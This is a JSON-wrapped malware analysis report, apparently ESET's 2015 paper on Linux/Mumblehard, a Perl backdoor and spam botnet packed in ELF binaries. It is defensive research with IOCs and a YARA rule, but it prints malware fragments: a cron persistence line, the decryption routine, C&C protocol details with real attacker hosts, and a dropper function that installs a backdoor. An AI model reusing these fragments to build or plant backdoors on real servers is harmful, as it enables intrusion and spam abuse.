{
    "id": "996db73b-6395-4fa1-bdb5-a8e17e847d0d",
    "created_at": "2022-10-25T16:48:19.447472Z",
    "updated_at": "2025-03-27T02:13:50.583735Z",
    "deleted_at": null,
    "sha1_hash": "b4e8fe336e0611e81ea6a7ad24a4f47279a074a5",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-04-28T16:59:21Z",
    "file_modification_date": "2015-04-28T16:59:26Z",
    "file_size": 3370582,
    "plain_text": "# Unboxing Linux/Mumblehard\n\n### Muttering spam from your servers\n\n## Marc-Etienne M.Léveillé\n\nApril 2015\n\n\n-----\n\n# Unboxing Linux/Mumblehard\n\n### Muttering spam from your servers\n\n## Marc-Etienne M.Léveillé\n\nApril 2015\n\n\n-----\n\n#### TABLE OF CONTENT\n\n1. Executive summary 3\n\n2. Introduction 4\n\n3. Malware analysis 5\n\n3.1 Perl code packed inside ELF binary 5\n\n3.2 The Perl backdoor 6\n\n3.2.1 C&C communication 7\n\n3.3 The Perl spammer 10\n\n3.3.1 C&C communication 10\n\n3.3.2 Proxying feature 12\n\n3.3.3 Spam content 13\n\n4. Statistics on infected hosts 14\n\n5. So, who is Yellsoft? 16\n\n5.1. \"Cracked\" DirectMailer 17\n\n6. Conclusion 19\n\nAppendix A: Indicators of compromise (IOCs) 20\n\nNetwork 20\n\nYARA rule 20\n\nAppendix B: Samples 21\n\n\n-----\n\n#### LIST OF TABLE\n\nTable 1. Data inside the PHPSESSID cookie 8\n\nTable 2. Example decrypted values for Mumblehard PHPSESSID cookie 9\n\nTable 3. Mumblehard spammer request to C&C server 10\n\nTable 4. Mumblehard spammer C&C response 11\n\nTable 5. Mumblehard general proxy \"Add allowed host\" command 12\n\nTable 6. Mumblehard general proxy \"Create connection\" command 12\n\n#### LIST OF FIGURES\n\nFigure 1 Yellsoft homepage as seen by the Wayback Machine in 2004 4\n\nFigure 2 Overview of Linux/Mumblehard interactions 5\n\nFigure 3 Entry point of Mumblehard packer making a system call 13 6\n\nFigure 4 Mumblehard decryption algorithm in assembly language 8\n\nFigure 5 Example spam message sent by Mumblehard 13\n\nFigure 6 Link target after redirection 13\n\nFigure 7 Number of unique IP addresses seen each day 14\n\nFigure 8 Yellsoft home page 16\n\nFigure 9 Softexp web page with DirectMailer download link as seen in 2014 17\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### 1. EXECUTIVE SUMMARY\n\nLinux/Mumblehard is a family of malware targeting servers running both the Linux and BSD operating\nsystems. A Mumblehard infected server opens a backdoor for the cybercriminals that allows them\nfull control of the system by running arbitrary code. It also has a general purpose-proxy and a module\nfor sending spam messages.\n\nMumblehard components are mainly Perl scripts encrypted and packed inside ELF binaries.\nIn some cases, the Perl script contains another ELF executable with the same packer in the fashion\nof a Russian nesting doll.\n\nESET researchers were able to sinkhole the backdoor module of Mumblehard and collect statistics\non the infected servers. This allowed us to count the population of infected hosts, determine who\nthe victims are and work with third parties to notify them.\n\nHere are the key findings of our analysis:\n\n- Perl scripts were packed inside ELF binaries written in assembly language, showing a higher\n\nlevel of sophistication than average.\n\n- A total of 8,867 unique IP addresses were seen in our sinkhole over a 7-month period.\n\n- The highest number of unique IP addresses seen in a single day is as high as 3,292.\n\n- Mumblehard has been active since at least 2009.\n\n- Among the compromised machines, web servers are the most susceptible to being infected.\n\n- There is a strong link between Mumblehard and Yellsoft, an online company selling software\n\nto send bulk e-mail messages.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### 2. INTRODUCTION\n\nESET discovered Linux/Mumblehard when a system administrator contacted us for assistance with\na server that was blacklisted for sending spam. We identified and dumped the memory of a process\nrunning on the server that was connecting to different SMTP servers and sending spam messages.\nThe memory dump clearly showed it to be a Perl interpreter. We investigated and found the executable\nfile in the /tmp directory. We started analyzing this ELF binary and discovered what we now\ncall Mumblehard.\n\nWe got interested in this threat because the way the Perl scripts used by the cybercriminals are\npacked inside ELF executables is uncommon and more complex than the average server threat.\n\nOur investigation showed that this group or individual has strong links with a software company\ncalled \"Yellsoft\". The first sample of the Mumblehard spammer component we were able to find\nwas submitted to VirusTotal in 2009. Yellsoft is active since 2004. It is unclear if they were involved\nin malicious activities between 2004 and 2009.\n\nFigure 1 Yellsoft homepage as seen by the Wayback Machine in 2004\n\nBased on the server where we made the discovery and the list of systems we have identified as\ninfected, there are two plausible infection vectors used to spread Mumblehard. The most popular\nvector seems to be the use of Joomla and Wordpress exploits. The other is through the distribution\nof backdoored \"pirated\" copies of a Linux and BSD program known as DirectMailer, software that\nYellsoft sells on their website for $240. The pirated copies actually install the Mumblehard backdoor\n(described later) that allows the operators to install additional malware. More details about this\nmethod of distribution are given in the \"Cracked\" DirectMailer section.\n\nThis paper describes the components used in Mumblehard, shows the statistics we were able\nto collect while sinkholing the backdoor, and gives some background about Yellsoft.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### 3. MALWARE ANALYSIS\n\nWe have analyzed two different malware components used by this group. The first one is a generic\nbackdoor that will request for commands from its C&C server. The commands contain a URL\nto a file to be downloaded and executed. The second one is a full-featured spammer daemon.\nBoth components are written in Perl and they are obfuscated with the same custom packer\nwritten in assembly. It consists of encrypted Perl code embedded inside an ELF binary.\n\nHere is a diagram showing the relationship between the malware components and their C&C servers:\n\n**C&C**\n\nHTTP GET\n\nDownload & execute\nLinux/Mumblehard spammer\n\nLinux/Mumblehard\nServer infected with backdoor c&c server\nLinux/Mumblehard backdoor\n\n**C&C**\n\nLinux/Mumblehard\nspammer c&c server\n\n**C&C**\n\nServer infected with\nLinux/Mumblehard spammer\n\nLinux/Mumblehard\nproxy c&c server\n\nFigure 2 Overview of Linux/Mumblehard interactions\n\nWe will first give technical details of the packer, then describe the functioning of the backdoor\nand the spamming software.\n\n##### 3.1 Perl code packed inside ELF binary\n\nOne of the first things that interested us about this malware family is the way the packer was made.\nLooking at the disassembled code, it is obvious this code was written in assembly. The whole packer\nactually consists of about 200 assembly instructions.\n\nAnother notable observation: system calls are made directly by using int 80h instructions. Another\n[hint that it was written in assembly is that functions do not have the usual prologue to manage](http://en.wikipedia.org/wiki/Function_prologue)\nthe stack.\n\nBy doing system calls with interrupts, Mumblehard ELF binaries avoid any external dependency.\nFurthermore, the packer works on both Linux and BSD systems. The system type is determined\nat the start of the program by doing a system call 13 with argument 0. It corresponds to time(NULL)\non Linux and fchdir(stdin) on BSD. The call fails with a negative value (-20 for ENOTDIR) in eax\non BSD, while time(NULL) succeeds on Linux and returns a positive value: the current number\nof seconds since January 1[st] 1970.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nFigure 3 Entry point of Mumblehard packer making a system call 13\n\nNext, the process will fork(), start the Perl interpreter with execve(\"/usr/bin/perl\", ...)\nand send the Perl script to the new process through its stdin. pipe and dup2 system calls take\ncare of handling file descriptors so that the parent process can write the decrypted Perl script\nto the interpreter.\n\n##### 3.2 The Perl backdoor\n\nThe backdoor component has a simple job: to ask its C&C servers for commands and report if it was\nsuccessful. The backdoor does not daemonize on an infected system. Instead, we’ve seen it installed\nin crontab and executed every 15 minutes.\n\n```\n$ crontab -l\n*/15 * * * * /var/tmp/qCVwOWA >/dev/null 2>&1\n\n```\n\nIt also disguises itself as httpd by assigning $0.\n\n```\n$0 = \"httpd\";\n\n```\n\nAt each run, every C&C server in the list is queried for a command, even if one has already sent\na valid command.\n\nThe Mumblehard backdoor supports only one command:\n\n- `0x10: Download from URL and execute.`\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nThere are 10 C&C servers in the list. This list was the same in all the samples we have analysed.\nWe have only witnessed one of them sending commands: 194.54.81.163. The others seem to be false\nflags. For example, behance.net has been owned by Adobe since 2005.\n\n- `184.106.208.157`\n\n- `194.54.81.163`\n\n- `advseedpromoan.com`\n\n- `50.28.24.79`\n\n- `67.221.183.105`\n\n- `seoratingonlyup.net`\n\n- `advertise.com`\n\n- `195.242.70.4`\n\n- `pratioupstudios.org`\n\n- `behance.net`\n\nNote that 194.54.81.163 only responds for a limited time, when it has a command to send.\nOtherwise, it doesn’t respond to TCP port 80.\n\n###### 3.2.1 C&C communication\n\nMumblehard makes HTTP GET requests to each C&C server on the list. The command is hidden\nin the Set-Cookie HTTP header of the response. It is one way to make the response appear legitimate\nand cause it to be overlooked when examining packet captures.\n\nExample response from the C&C server\n\n```\nHTTP/1.0 200 OK\nDate: Sat, 14 Feb 2015 23:01:57 GMT\nServer: Apache/1.3.41 (Unix)\nSet-Cookie: PHPSESSID=260518103c38332d35373729393e39253e3c3b207f66736577722861646b6c\n697e217c647066603a7f66706363606f61; path=/\nContent-Length: 18\nConnection: close\nContent-Type: text/html\nunder construction\n\n```\n\nThe PHPSESSID cookie sent by the server is hex-encoded. The strings inside the commands\nare also encrypted with a custom algorithm. This algorithm is the same as the one used in the packer\nto obfuscate the Perl script. It ties the Perl script tightly to the custom packer; thus, the same group\nprobably wrote both pieces of code\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nFigure 4 Mumblehard decryption algorithm in assembly language\n\nMumblehard decryption algorithm in Perl (tidied)\n\n```\nsub xorl {\n my ($line, $code, $xor, $lim) = (shift, \"\", 1, 16);\n foreach my $chr (split (//, $line)) {\n if ($xor == $lim) {\n $lim = 0 if $lim == 256;\n $lim += 16;\n $xor = 1;\n }\n $code .= pack (\"C\", unpack (\"C\", $chr) ^ $xor);\n $xor ++;\n }\n return $code;\n}\n\n```\n\nOnce decrypted, the following information is extracted from the \"cookie\":\n\n\nTable 1. Data inside the PHPSESSID cookie\n\n\nField name Size Description\n\nURL length Integer (1 byte) The length in bytes of the URL to get the executable file.\n\nFile name length Integer (1 byte) The length in bytes of the target file name.\n\nId Integer (1 byte) Unused by Mumblehard but reported back to C&C\nafter receiving a command. This value seems\nto always be set to 0x18 by the C&C server.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nField name Size Description\n\nCommand Integer (1 byte) Must be 0x10 (download and execute).\n\nTimeout value Integer (1 byte) The time in seconds to wait for a response from URL.\n\nURL String (URL length bytes) Encrypted URL where the executable resides.\n\n\nFile name String\n(File name length bytes)\n\n\nEncrypted name of the file where the file is downloaded\ninside /tmp.\n\n\nHere is an example of a decrypted command received by the C&C server:\n\n\nTable 2. Example decrypted values for Mumblehard PHPSESSID cookie\n\n\nField name Value (hex) Value Meaning\n\nURL length 0x26 38 URL is 38 bytes long\n\nFile name length 0x05 5 File name is 5 bytes long\n\nId 0x18 24 None\n\nCommand 0x10 16 Download and execute\n\nTimeout value 0x20 32 Wait 32 seconds for an answer.\n\n\nURL 38332[…]7f6670 Decrypts to\n\"91.121.173.215/\n~dpart/images/stats.jpg\"\n\n\nFile to download\n\n\nFile name 6363606f61 Decrypts to \"backd\" Content will be downloaded\nto /tmp/backd\n\nMumblehard uses a hardcoded user agent when requesting a command.\n\nMumblehard backdoor user agent\n\n```\nMozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\n\n```\n\nThis user agent string is the same as the one used by Firefox 7.0.1 running on Windows 7.\n\nAfter a \"download and execute\" is completed, Mumblehard reports to each C&C server\nthat it downloaded the file (or not). This information is camouflaged inside the user agent strings\nwith the following format:\n\n```\nMozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/<command_id>.<http_\nstatus>.<downloaded_file_size> Firefox/7.0.1\n\n```\n\nAn example user agent for a report of a successful (HTTP 200 OK) download-and-execute command\nwith job id 0x18 (24) leading to a 56,013 byte executable would be:\n\n```\nMozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/24.200.56013 Firefox/7.0.1\n\n```\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n##### 3.3 The Perl spammer\n\nThe spamming daemon is also written in Perl and packed inside an ELF binary. Its purpose\nis to send spam by asking its C&C servers for jobs, but also includes a general-purpose proxy.\nMumblehard supports most of features you would find in a spammer program: templates, reporting,\nSMTP implementation, and so on. We will limit our description to the components unique\nto Mumblehard and its network protocol.\n\nPerl is multi-platform, so the Mumblehard Perl spammer software should run on different operating\nsystems. However, the use of EWOULDBLOCK and EINPROGRESS constants in Mumblehard is nonportable. Nonetheless, Mumblehard defines the constants for Linux, FreeBSD and Windows,\nenabling the Perl script to run on these major systems. This suggests that this group could be\ninfecting a lot of different systems. Although the ELF binary will not load on Windows, it’s possible\nthat the malware is used without the packer or with a different packer for this platform.\n\nMumblehard Perl spammer supports Linux, FreeBSD and Windows\n\n```\nif ( $^O eq \"linux\" ) { $ewblock = 11; $eiprogr = 115; }\nif ( $^O eq \"freebsd\" ) { $ewblock = 35; $eiprogr = 36; }\nif ( $^O eq \"MSWin32\" ) { $ewblock = 10035; $eiprogr = 10036; }\n\n```\n\nWe have seen the spammer component distributed via the Mumblehard backdoor described earlier.\nThe spammer is not persistent: it will quit when the server doesn’t have any more spam jobs to do.\nThe persistent backdoor is sufficient and is stealthier.\n\nThe component has two distinct ways of sending spam: by asking the C&C servers for jobs\nand by starting a proxy.\n\n###### 3.3.1 C&C communication\n\nThe Mumblehard C&C server runs on port 25, but expects an HTTP POST request with binary data\nas its content. The content is described in the following table:\n\n\nTable 3. Mumblehard spammer request to C&C server\n\n\nName Size Description\n\nMagic 2 bytes Always 0x0F0F\n\nVersion Integer (1 byte) Latest version we have seen is 9\n\nCommand Integer (1 byte) 2 if it’s the first request, 1 if to report the job is done\nor 0 if the job is still running\n\nPid Integer (4 bytes) The Perl’s process identifier\n\nExtra data size Integer (4 bytes) Size of the remaining data\n\nExtra data _Extra data size bytes_ Contains job report\n\nThere seems to be only one case where the extra data would be used: reporting how many successful\ne-mails were transmitted. It has a four 32-bit integer header:\n\n1. A job identifier\n\n2. The number of e-mail messages successfully sent\n\n3. The number of e-mail messages that couldn’t be sent due to a network error\n\n4. The number of e-mail messages refused by the SMTP server\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nThe operator can also set the verbosity of the report to 3 different levels. The lowest one only\nhas the number, the second level reports the e-mail addresses in each categories and the most\nverbose will also send the reason for failure or success.\n\nThe response from the server is a HTTP 200 OK and contains settings, e-mail list and the spam\ntemplate to be used.\n\n\nTable 4. Mumblehard spammer C&C response\n\n\nName Size Description\n\nMagic 2 bytes Always 0xAFAF\n\nTimeout Integer (2 bytes) Connection timeout in seconds to C&C server\n\nRequest Integer (1 byte) Make request time in minutes\n\nCommand Integer (1 byte) Exits if non-zero\n\nSize Integer (4 bytes) Size for the rest of the response\n\nJob id Integer (4 bytes) A job identifier that will be included in the report to\nthe C&C server\n\nClient IP IP address (4 bytes) IP address of the infected host as seen by C&C server\n\nNameservers (16) IP address (16 x 4 bytes) Nameservers to use for resolving PTR, MX and\nA record to send mail\n\nTimeout Integer (2 bytes) Connection timeout in seconds to SMTP server\n\n\nMax concurrent SMTP\nsession\n\n\nInteger (2 bytes) Number of concurrent TCP connection\nto an SMTP server (0 for unlimited)\n\n\nCopies Integer (1 byte) Number of copies of the e-mail to send\n\nMethod Integer (1 byte) If zero, include a bunch of e-mail address\nin the \"To\" field. Otherwise just include one.\n\nSPF Integer (1 byte) If non-zero, use the same domain as in the HELO\nfield in the \"From\" header\n\nReport type Integer (1 byte) How verbose the report should be (0, 1 or 2)\n\nSize of recipient list Integer (4 bytes) Size of the recipient list in bytes\n\nRecipient list _Size of recipient list bytes_ Spam recipients separated by \"\\x0A\"\n\nSize of \"from\" list Integer (4 bytes) Size of the \"from\" list in bytes\n\n\nList of e-mail to spoof\nin from field\n\n\n_Size of \"from\" list bytes_ From fields separated by \"\\x0A\"\n\n\nSize of \"reply to\" list Integer (4 bytes) Size of the from list in bytes\n\n\nList of e-mail to spoof\nin reply-to field\n\n\n_Size of \"reply to\" list bytes_ Reply-To fields separated by \"\\x0A\"\n\n\nSize of subjects list Integer (4 bytes) Size of the subjects list in bytes\n\n\nList of subjects to use\nin spam messages\n\n\n_Size of subjects list bytes_ Subject fields separated by \"\\x0A\"\n\n\nSize of headers Integer (4 bytes) Size of the headers template (Can be zero to use\nhardcoded ones)\n\nHeaders _Size of headers bytes_ E-mail message header template\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nName Size Description\n\nSize of message Integer (4 bytes) Size of the spam message template\n\nMessage _Size of message bytes_ Template of the spam message\n\nPriority Integer (1 byte) Set the \"Priority\" e-mail header value to \"Low\" (0),\n\"Normal\" (1) or \"High\" (2)\n\nContent type Integer (1 byte) \"plain\" if zero, \"html\" otherwise\n\nCharset Rest of data Encoding used in the template\n\n###### 3.3.2 Proxying feature\n\nMost Mumblehard spammer samples we have analyzed also have a generic proxy component.\nThe way it works is quite simple: it listens for inbound connections on a TCP port and sends a notification\nthat it’s now available to its C&C server on that port. At this point, only connection from the C&C server\nis allowed on the listening socket, but more hosts can be added to the allowed list. In fact, only two\ncommands can be sent to the infected host.\n\n1. Add IP address to the allowed list\n\n2. Create new TCP tunnel\n\nFor reference, here is the binary protocol on the listening socket:\n\n\nTable 5. Mumblehard general proxy \"Add allowed host\" command\n\n\nName Size Description\n\nCommand 2 bytes Always 0x7B, 0x10\n\nRestart timer Integer (2 bytes) Restart timeout value if value is 128\n\n_Unused_ 14 bytes Unused\n\nIP count Integer (2 bytes) Number of IP addresses to add to the white list\n\n\nIP IP address (IP count x 4\nbytes)\n\n\nThe IPs to add to the white list\n\n\nTable 6. Mumblehard general proxy \"Create connection\" command\n\n\nName Size Description\n\nCommand 2 bytes Always 0x04, 0x01\n\nPort Integer (2 bytes) TCP port of the proxy target\n\nIP IP address (4 bytes) IP address of the proxy target\n\nThe create \"Connection command\" command is actually an implementation of the SOCKS4 protocol.\nThe response codes also match the specification. This feature allows the criminals to tunnel arbitrary\ntraffic through the infected host. However we have never seen this feature used on an infected\nmachine so it is hard to say what it is used for, or whether it’s ever been used at all.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n###### 3.3.3 Spam content\n\nThe spam content we have witnessed on our tracker is mostly for promoting pharmaceutical\nproducts with links to various online stores. Here is an example of a message as seen by a victim\nreceiving spam.\n\nFigure 5 Example spam message sent by Mumblehard\n\nThe link leads to an online store selling drugs for erectile dysfunction.\n\nFigure 6 Link target after redirection\n\n[These Canadian pharmacy sites are well documented on spamtrackers.eu.](http://spamtrackers.eu/wiki/index.php/Canadian_Health%2526Care_Mall)\n\nAnother feature unique to the spam template is the use of random message headers that seems\nto be built using two or three random words, such as:\n\n```\nMillion-Explosively-Arrogance: B77FE821EAB1\nCopes-Horribly: 881976c526e6\nFormants-Carmichael-Cutlet: consistency\nInteroffice-Gastronome-Unmodified: d41f7ebe89a\n\n```\n\nIt is unclear whether these are added to fool anti-spam solutions and if so, whether their inclusion\nis effective.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### 4. STATISTICS ON INFECTED HOSTS\n\nThe list of C&C servers present in Mumblehard’s backdoor contained domains that has been previously\nregistered but were now available for purchase. We have bought one of these domains in order\nto monitor the activity of the infected hosts. Bots are easy to distinguish due to their specific\nhardcoded user agent string. Two design choices made by the Mumblehard backdoor author\nhelped us in collecting data about the victims:\n\n- Mumblehard will ask for a command from every C&C server in the list, even if one of them\n\nhas already responded.\n\n- Mumblehard will report back to every C&C server the success or failure of the download\n\nand execute command, even if the command doesn’t originate from that C&C.\n\nSure enough, our sinkhole was hit by each infected machine 4 times per hour: on the hour, quarter\npast the hour, half past the hour and quarter to the hour. This matches the cron job description found\non systems infected with the backdoor.\n\nWe collected data between September 19th 2014 and April 22[nd] 2015, but the sinkhole server was\noffline between December 7th 2014 and January 6th 2015. During the period over which we collected\ndata, we saw Mumblehard queries from 8,867 unique IP addresses. The majority of them are servers\nthat are used for hosting websites.\n\n3500 Unique \r IP \r addresses Number \r of \r successful \r commands 60000\n\n3000\n\n50000\n\n2500\n\n40000\n\n2000\n\n30000\n\n1500\n\n20000\n\n1000\n\n10000\n\n500\n\n0 0\n\nFigure 7 Number of unique IP addresses seen each day\n\nWe can see that the number of infected hosts is slowly decreasing, but has timely increases from\ntime to time. The operators are initiating discrete waves of server infection rather than spreading\nin a continuous fashion.\n\nWe can also observe the number of successful commands sent by the C&C server to its bots.\nAs we described in the malware analysis section the command includes a URL to the executable\nfile to fetch. The HTTP status code received for that request is reported back by the Mumblehard\n\n|3500 3000 2500 2000 addresses IP Unique 1500 1000 500 0 22222 222 2222 00000 000 0000 11111 111 1111 44444 444 4444 ‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ - 11111 111 1100 21111 000 0099 ‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ - 02210 321 1021 58147 147 0369|Unique IP addresses Number of successful commands 60000 50000 Number of 40000 successful downoload 30000 nd a execute commands 20000 sent 10000 0 2222222222222222 0000000000000000 1111111111111111 5555555555555555 ‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ - 0000000000000000 4444333322221111 ‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ -‐­ - 2100211021102210 2581581458148147|\n|---|---|\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nbackdoor in the user agent field received by our sinkhole. We define a successful command by a bot\nas reporting back that the download yielded a HTTP 200 status code.\n\nAs we can see, the C&C server does not always supply download-and-execute commands to its bots.\nIn fact, most of the time it doesn’t even listen on TCP port 80. There are some peaks in traffic where\nit’s heavily used. For example, on March 27th, we were watching 2,508 bots that received a total\nof 49,729 commands. If the operators are continuously answering with a download-and-execute\nto all the bots connecting at 15-minute intervals, it means that the network was used for 5 continuous\nhours. There are also days where the backdoor isn’t used at all. Out of 187 days of collected data,\nit was only used for 120 days, representing 64% of the time when traffic was monitored.\n\nIt is difficult to explain these differences. It is possible that the operators are limiting the amount\nof spam they send so as to stay under the radar and keep the reputation of the affected IP addresses\nintact. On the other hand, if the spamming daemon on these systems is still receiving jobs from the\nspammer C&C server it will continue to run even if the backdoor C&C server is offline. The operators\ncould just try to expand their spamming capabilities with the backdoor.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### 5. SO, WHO IS YELLSOFT?\n\nThe C&C servers hardcoded in the Mumblehard samples are all located in the IP range 194.54.81.162\nto 194.54.81.164.\n\n`194.54.81.162:53` Hardcoded DNS server in Mumblehard’s spammer\n\n`194.54.81.163:54321` Report from Mumblehard’s proxy is open\n\n`194.54.81.163:25` C&C server for Mumblehard’s spammer\n\n`194.54.81.164:25` C&C server for Mumblehard’s spammer\n\nIf you check out the two next IP addresses, 194.54.81.165 and 194.54.81.166, you will find\nthat both are name servers for yellsoft.net. Also, the yellsoft.net web server is hosted\nat 194.54.81.166. If you dig further, the five IP addresses, from 162 to 166, will answer the same NS\nand SOA record for this IP range, despite the fact that in reality, this range is served by rx-name.com.\nThis strongly suggests that the five IP addresses are hosted on the same server.\n\n```\n$ dig +short -x 194.54.81 SOA | uniq -c\n  1 ns1.rx-name.net. hostmaster.81.54.194.in-addr.arpa. 2015031209 28800 7200\n  604800 86400\n$ for i in 2 3 4 5 6; do dig +short -x 194.54.81 SOA @194.54.81.16$i; done | uniq -c\n  5 ns1.yellsoft.net. support.yellsoft.net. 2013051501 600 300 604800 600\n\n```\n\nWhat is Yellsoft anyway? It sells software called DirectMailer for sending bulk e-mail messages.\nAccording to the home page, DirectMailer is written in Perl and runs on UNIX-type systems.\nPretty much like Mumblehard.\n\nFigure 8 Yellsoft home page\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n##### 5.1. \"Cracked\" DirectMailer\n\nOn the homepage, Yellsoft makes sure to tell its visitors that the company doesn’t offer support\nfor copies of the software downloaded from http://softexp.narod.ru, with a link to the page.\nThis page is hosted on narod.ru, a free web hoster. Let’s see if we can get a copy of DirectMailer\nfrom there.\n\nFigure 9 Softexp web page with DirectMailer download link as seen in 2014\n\nSure enough, in 2014 you could download a directmailer-retail.zip file with a copy of DirectMailer.\nSince ESET Anti-Virus products started detecting DirectMailer as malicious, the software is no longer\nbeing distributed on softexp.narod.ru.\n\nThe zip archive contains a dm.pl executable file. Despite the .pl extension, it is not a Perl script,\nbut an ELF executable. This executable file contains a Perl script packed with the Mumblehard packer.\n\nAnalysis of the Perl script shows that a function called bdrp is invoked before the main program\nis started. This function has a uuencoded blob, which, once decoded, generates another ELF file.\nThis ELF file is a packed Perl script consisting of the Mumblehard backdoor. It is written to the file\nsystem and a cron job is added to run it every 15 minutes. Sound familiar?\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\nTidied and commented bdrp function\n\n```\nsub bdrp {\n  my $bdrp = <<'BDRPDATA';\nM?T5,1@$!`0D```````````(``P`!````3(`$\"\"P``````````````#0`(``!\nM``````````\"`!`@`@`0(\"1H``!X>```'`````!```(DE\"9H$\"+@-````,=M3\n...\nM)S5I=6=\\9&(Z-WQT>'-T?#,@/'YR<%-$`@=,1$A#1$P1\"U$-7$I$1$!=#Q5+\n%%T491S$`\nBDRPDATA\n  $bdrp = unpack( \"u*\", $bdrp );\n  foreach my $bdrpp ( \"/var/tmp\", \"/tmp\" ) {\n    # Delete all executable files in temporary directory\n    # (delete existing Mumblehard installation)\n    for (<$bdrpp/*>) { unlink $_ if ( -f $_ && ( -x $_ || -X $_ ) ); }\n    # Create random file name\n    my $bdrpn = [ \"a\" .. \"z\", \"A\" .. \"Z\" ];\n    $bdrpn = join( \"\",\n      @$bdrpn[ map { rand @$bdrpn } ( 1 .. ( 6 + int rand 5 ) ) ] );\n    my $bdrpb = \"$bdrpp/$bdrpn\";\n    my $bdrpc = $bdrpb . int rand 9;\n    # crontab job to add (runs every 15 minutes)\n    my $bdrpt = \"*/15 * * * * $bdrpb >/dev/null 2>&1\\n\";\n    if ( open( B, \">\", $bdrpb ) ) {\n      # Drop file and install job with crontab\n      [...]\n    }\n  }\n}\n\n```\n\nFurthermore, dm.pl forks, starts listening for inbound connection on a TCP port and report back\nto Mumblehard’s C&C server that it’s available to proxy traffic. This code is exactly the same\nas Mumblehard’s spammer proxy feature.\n\n\"Cracked\" copies of DirectMailer actually give the operators a backdoor to the servers on which\nit is installed and allow criminals to proxy traffic in order to send spam.\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### 6. CONCLUSION\n\nMalware targeting Linux and BSD servers is becoming more and more complex. The fact that the authors\nused a custom packer to hide the Perl source code is somewhat sophisticated. However, it is definitely\nnot as complex as the Windigo Operation we documented in 2014. Nonetheless, it is worrying that\nthe Mumblehard operators have been active for many years without disruption.\n\nIt is unclear if spamming is the only goal of this group. In theory, it is possible for the cybercriminals\nto deploy other executable files to thousands of servers at once. Do they send other types of spam\nwith their botnet? Is a pharmaceutical online store lucrative enough to justify the effort?\n\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n\n#### APPENDIX A: INDICATORS OF COMPROMISE (IOCS)\n\n##### Network\n\nUDP packets to\n\n- 194.54.81.162 port 53\n\nTCP connections to\n\n- 194.54.81.163 port 80 (backdoor)\n\n- 194.54.81.163 port 54321 (proxy)\n\n- 194.54.81.163 port 25 (spammer)\n\n- 194.54.81.164 port 25 (spammer)\n\nHTTP requests with the following User-Agent pattern\n\n- `Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/<1 or more digits>.<1 or`\n```\n more digits>.<1 or more digits> Firefox/7.0.1\n\n##### YARA rule\nmumblehard_packer.yara\n\n```\n```\nrule mumblehard_packer\n{\n  meta:\n    description = \"Mumblehard i386 assembly code responsible for decrypting Perl\n    code\"\n    author = \"Marc-Etienne M.Léveillé\"\n    date = \"2015-04-07\"\n    reference = \"http://www.welivesecurity.com\"\n    version = \"1\"\n  strings:\n    $decrypt = { 31 db [1-10] ba ?? 00 00 00 [0-6] (56 5f | 89 F7)\n    39 d3 75 13 81 fa ?? 00 00 00 75 02 31 d2 81 c2 ?? 00 00\n    00 31 db 43 ac 30 d8 aa 43 e2 e2 }\n  condition:\n    $decrypt\n}\n\n```\n\n-----\n\n## Unboxing Linux/Mumblehard\n\n#### APPENDIX B: SAMPLES\n\nSHA-1 sum File type First seen\non Virus\nTotal\n\n\nESET Detection name Description\n\n\n`65a2dc362556b55cf2dbe3a10a2b337541eea4eb` ELF executable 2009-05-11 Linux/Mumblehard.K.Gen Mumblehard spammer\n\n`331ca10a5d1c5a5f3045511f7b66340488909339` ELF executable 2014-06-06 Linux/Mumblehard.E.Gen Mumblehard spammer\n\n`2f2e5776fb7405996feb1953b8f6dbca209c816a` ELF executable 2014-07-01 Linux/Mumblehard.D.Gen Mumblehard backdoor\n\n`95aed86918568b122712bdbbebdd77661e0e6068` ELF executable 2014-11-23 Linux/Mumblehard.J.Gen Mumblehard backdoor\n\n`c83042491efade4a4a46f437bee5212033c168ee` ZIP archive 2014-07-04 Linux/Mumblehard.E.Gen Pirated copy of DirectMailer archive with\ndm.pl dropping Mumblehard backdoor\n\n`e62c7c253f18ec7777fdd57e4ae500ad740183fb` ELF executable 2014-05-17 Linux/Mumblehard.E.Gen Pirated copy of DirectMailer dropping\nMumblehard backdoor (dm.pl)\n\n`58d4f901390b2ecb165eb455501f37ef8595389a` ZIP archive 2009-03-25 Linux/Mumblehard.M.Gen Pirated copy of DirectMailer 1.5 archive\nwith dm.cgi opening a Mumblehard proxy\n\n`4ae33caebfd9f1e3481458747c6a0ef3dee05e49` ELF executable 2013-06-27 Linux/Mumblehard.M.Gen Pirated copy of DirectMailer 1.5 opening\na proxy (dm.cgi)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
